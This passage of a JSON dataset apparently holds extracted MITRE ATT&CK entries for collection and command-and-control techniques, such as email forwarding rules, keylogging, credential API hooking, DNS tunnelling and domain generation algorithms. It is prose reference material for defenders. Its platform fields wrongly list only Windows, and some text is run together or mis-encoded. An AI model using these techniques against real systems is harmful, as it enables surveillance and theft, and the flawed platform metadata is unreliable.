    "description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality withincmdmay be used to gather information.Some adversaries may also useAutomated Collectionon removable media.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:36.520360",
    "subtechniques": []
  },
  {
    "technique_id": "T1074",
    "name": "Data Staged",
    "description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such asArchive Collected Data. Interactive command shells may be used, and common functionality withincmdand bash may be used to copy data into a staging location.[1]In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary mayCreate Cloud Instanceand stage data in that instance.[2]Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:39.850247",
    "subtechniques": [
      {
        "id": "T1074.001",
        "name": "Local Data Staging"
      },
      {
        "id": "T1074.002",
        "name": "Remote Data Staging"
      }
    ]
  },
  {
    "technique_id": "T1074.001",
    "name": "Local Data Staging",
    "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such asArchive Collected Data. Interactive command shells may be used, and common functionality withincmdand bash may be used to copy data into a staging location.Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.[1]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Staged",
    "parent_technique_id": "T1074",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:43.297542"
  },
  {
    "technique_id": "T1074.002",
    "name": "Remote Data Staging",
    "description": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such asArchive Collected Data. Interactive command shells may be used, and common functionality withincmdand bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary mayCreate Cloud Instanceand stage data in that instance.[1]By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Staged",
    "parent_technique_id": "T1074",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:46.641812"
  },
  {
    "technique_id": "T1114",
    "name": "Email Collection",
    "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.[1][2]Adversaries can collect or forward email from mail servers or clients.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:49.990409",
    "subtechniques": [
      {
        "id": "T1114.001",
        "name": "Local Email Collection"
      },
      {
        "id": "T1114.002",
        "name": "Remote Email Collection"
      },
      {
        "id": "T1114.003",
        "name": "Email Forwarding Rule"
      }
    ]
  },
  {
    "technique_id": "T1114.001",
    "name": "Local Email Collection",
    "description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a userâ€™s local system, such as Outlook storage or cache files.Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.[1]IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored inC:\\Users\\<username>\\Documents\\Outlook FilesorC:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook.[2]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Email Collection",
    "parent_technique_id": "T1114",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:53.339056"
  },
  {
    "technique_id": "T1114.002",
    "name": "Remote Email Collection",
    "description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such asMailSnipercan be used to automate searches for specific keywords.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Email Collection",
    "parent_technique_id": "T1114",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:56.702672"
  },
  {
    "technique_id": "T1114.003",
    "name": "Email Forwarding Rule",
    "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victimâ€™s organization to use as part of further exploits or operations.[1]Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.[2]Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.[3][4]Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.[2]In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.[5]Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Email Collection",
    "parent_technique_id": "T1114",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:00.013160"
  },
  {
    "technique_id": "T1056",
    "name": "Input Capture",
    "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g.Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g.Web Portal Capture).",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:03.273789",
    "subtechniques": [
      {
        "id": "T1056.001",
        "name": "Keylogging"
      },
      {
        "id": "T1056.002",
        "name": "GUI Input Capture"
      },
      {
        "id": "T1056.003",
        "name": "Web Portal Capture"
      },
      {
        "id": "T1056.004",
        "name": "Credential API Hooking"
      }
    ]
  },
  {
    "technique_id": "T1056.001",
    "name": "Keylogging",
    "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities whenOS Credential Dumpingefforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.[1]Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.[2]Some methods include:Hooking API callbacks used for processing keystrokes. UnlikeCredential API Hooking, this focuses solely on API functions intended for processing keystroke data.Reading raw keystroke data from the hardware buffer.Windows Registry modifications.Custom drivers.Modify System Imagemay provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.[3]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:06.730230"
  },
  {
    "technique_id": "T1056.002",
    "name": "GUI Input Capture",
    "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex:Bypass User Account Control).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.[1]This type of prompt can be used to collect credentials via various languages such asAppleScript[2][3][4]andPowerShell.[2][5][4]On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e.Unix Shell).[4]Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e.,Browser Information Discoveryand/orApplication Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:09.986942"
  },
  {
    "technique_id": "T1056.003",
    "name": "Web Portal Capture",
    "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access throughExternal Remote ServicesandValid Accountsor as part of the initial compromise by exploitation of the externally facing web service.[1]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:13.326391"
  },
  {
    "technique_id": "T1056.004",
    "name": "Credential API Hooking",
    "description": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.[1]UnlikeKeylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials.In Windows, hooking involves redirecting calls to these functions and can be implemented via:Hooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.[2][3]Import address table (IAT) hooking, which use modifications to a processâ€™s IAT, where pointers to imported API functions are stored.[3][4][5]Inline hooking, which overwrites the first bytes in an API function to redirect code flow.[3][6][5]In Linux and macOS, adversaries may hook into system functions via theLD_PRELOAD(Linux) orDYLD_INSERT_LIBRARIES(macOS) environment variables, which enables loading shared libraries into a programâ€™s address space. For example, an adversary may capture credentials by hooking into thelibc readfunction leveraged by SSH or SCP.[7]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:16.687385"
  },
  {
    "technique_id": "T1113",
    "name": "Screen Capture",
    "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such asCopyFromScreen,xwd, orscreencapture.[1][2]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:20.144054",
    "subtechniques": []
  },
  {
    "technique_id": "T1125",
    "name": "Video Capture",
    "description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs fromScreen Capturedue to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.[1]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:23.492690",
    "subtechniques": []
  },
  {
    "technique_id": "T1071",
    "name": "Application Layer Protocol",
    "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.[1]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:26.830945",
    "subtechniques": [
      {
        "id": "T1071.001",
        "name": "Web Protocols"
      },
      {
        "id": "T1071.002",
        "name": "File Transfer Protocols"
      },
      {
        "id": "T1071.003",
        "name": "Mail Protocols"
      },
      {
        "id": "T1071.004",
        "name": "DNS"
      },
      {
        "id": "T1071.005",
        "name": "Publish/Subscribe Protocols"
      }
    ]
  },
  {
    "technique_id": "T1071.001",
    "name": "Web Protocols",
    "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such as HTTP/S[1]and WebSocket[2]that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Application Layer Protocol",
    "parent_technique_id": "T1071",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:30.405761"
  },
  {
    "technique_id": "T1071.002",
    "name": "File Transfer Protocols",
    "description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such as SMB[1], FTP[2], FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Application Layer Protocol",
    "parent_technique_id": "T1071",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:33.755840"
  },
  {
    "technique_id": "T1071.003",
    "name": "Mail Protocols",
    "description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.[1]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Application Layer Protocol",
    "parent_technique_id": "T1071",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:37.108549"
  },
  {
    "technique_id": "T1071.004",
    "name": "DNS",
    "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.[1][2]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Application Layer Protocol",
    "parent_technique_id": "T1071",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:40.468758"
  },
  {
    "technique_id": "T1071.005",
    "name": "Publish/Subscribe Protocols",
    "description": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.Protocols such asMQTT,XMPP,AMQP, andSTOMPuse a publish/subscribe design, with message distribution managed by a centralized broker.[1][2]Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics.[1]An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Application Layer Protocol",
    "parent_technique_id": "T1071",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:43.788814"
  },
  {
    "technique_id": "T1092",
    "name": "Communication Through Removable Media",
    "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.[1]Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement byReplication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:47.131604",
    "subtechniques": []
  },
  {
    "technique_id": "T1659",
    "name": "Content Injection",
    "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e.,Drive-by Targetfollowed byDrive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e.,Ingress Tool Transfer) and other data to already compromised systems.[1]Adversaries may inject content to victim systems in various ways, including:From the middle, where the adversary is in-between legitimate online client-server communications (Note:this is similar but distinct fromAdversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment)[2]From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server[3]Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"[3][1][4]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:50.458401",
    "subtechniques": []
  },
  {
    "technique_id": "T1132",
    "name": "Data Encoding",
    "description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.[1][2]Some data encoding systems may also result in data compression, such as gzip.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:53.794749",
    "subtechniques": [
      {
        "id": "T1132.001",
        "name": "Standard Encoding"
      },
      {
        "id": "T1132.002",
        "name": "Non-Standard Encoding"
      }
    ]
  },
  {
    "technique_id": "T1132.001",
    "name": "Standard Encoding",
    "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.[1][2]Some data encoding systems may also result in data compression, such as gzip.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Encoding",
    "parent_technique_id": "T1132",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:22:57.207504"
  },
  {
    "technique_id": "T1132.002",
    "name": "Non-Standard Encoding",
    "description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.[1][2]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Encoding",
    "parent_technique_id": "T1132",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:00.563060"
  },
  {
    "technique_id": "T1001",
    "name": "Data Obfuscation",
    "description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect.[1]Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:03.876728",
    "subtechniques": [
      {
        "id": "T1001.001",
        "name": "Junk Data"
      },
      {
        "id": "T1001.002",
        "name": "Steganography"
      },
      {
        "id": "T1001.003",
        "name": "Protocol or Service Impersonation"
      }
    ]
  },
  {
    "technique_id": "T1001.001",
    "name": "Junk Data",
    "description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult.[1]By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Obfuscation",
    "parent_technique_id": "T1001",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:07.189104"
  },
  {
    "technique_id": "T1001.002",
    "name": "Steganography",
    "description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Obfuscation",
    "parent_technique_id": "T1001",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:10.609394"
  },
  {
    "technique_id": "T1001.003",
    "name": "Protocol or Service Impersonation",
    "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.[1][2]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data Obfuscation",
    "parent_technique_id": "T1001",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:13.932544"
  },
  {
    "technique_id": "T1568",
    "name": "Dynamic Resolution",
    "description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.Adversaries may use dynamic resolution for the purpose ofFallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.[1][2][3]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:17.397725",
    "subtechniques": [
      {
        "id": "T1568.001",
        "name": "Fast Flux DNS"
      },
      {
        "id": "T1568.002",
        "name": "Domain Generation Algorithms"
      },
      {
        "id": "T1568.003",
        "name": "DNS Calculation"
      }
    ]
  },
  {
    "technique_id": "T1568.001",
    "name": "Fast Flux DNS",
    "description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.[1][2][3]The simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.[3]In contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Dynamic Resolution",
    "parent_technique_id": "T1568",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:23:20.739315"
  },
  {
    "technique_id": "T1568.002",
    "name": "Domain Generation Algorithms",
    "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.[1][2][3]DGAs can take the form of apparently random or \"gibberish\" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.[1][2][4][5]Adversaries may use DGAs for the purpose ofFallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.[4][6][7]",
    "tactic": "Command and Control",
    "tactics": [
      "Command and Control"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Dynamic Resolution",
    "parent_technique_id": "T1568",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
